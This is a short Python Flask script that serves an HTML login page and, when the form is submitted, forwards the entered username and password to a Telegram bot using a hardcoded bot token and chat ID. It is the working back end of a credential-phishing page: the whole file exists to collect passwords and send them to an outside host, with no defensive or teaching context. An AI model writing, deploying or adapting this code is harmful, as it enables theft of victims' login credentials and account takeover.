from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# Load HTML file
with open("index.html") as f:
    html_page = f.read()

# Telegram Bot details
BOT_TOKEN = "8273890387:AAG8BbidwS-UkY_Ct-bdmbFbHq6xr_qdBqM"
CHAT_ID = "6291023089"

@app.route("/")
def home():
    return render_template_string(html_page)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")
    
    # Send to Telegram
    message = f"Username: {username}\nPassword: {password}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.get(url, params={"chat_id": CHAT_ID, "text": message})

    return "<h3>Login info sent successfully!</h3>"

if __name__ == "__main__":
    app.run(debug=True)
